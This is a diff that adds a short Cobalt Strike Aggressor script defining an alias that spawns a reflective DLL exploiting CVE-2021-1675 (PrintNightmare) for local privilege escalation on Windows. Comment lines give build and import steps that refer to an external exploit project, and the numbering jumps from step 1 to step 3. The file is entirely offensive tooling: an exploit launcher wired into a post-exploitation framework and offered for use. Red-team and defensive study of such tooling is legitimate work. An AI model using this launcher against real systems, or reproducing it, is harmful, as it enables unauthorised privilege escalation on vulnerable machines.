@@ -1,0 +1,6 @@
+# 1- Open the project (https://github.com/hlldz/CVE-2021-1675-LPE/) in Microsoft Visual Studio (set the DLL payload path for Reflective DLL in main.cpp file of CVE-2021-1675-LPE-RDLL main.cpp, line 111) and compile.
+# 3- Import script. Usage: lpe_cve_2021_1675
+
+alias lpe_cve_2021_1675 {
+	bdllspawn($1, script_resource("CVE-2021-1675-LPE-RDLL.dll"), $2, "Local Privilege Escalation Edition of CVE-2021-1675", 5000, false);
+}
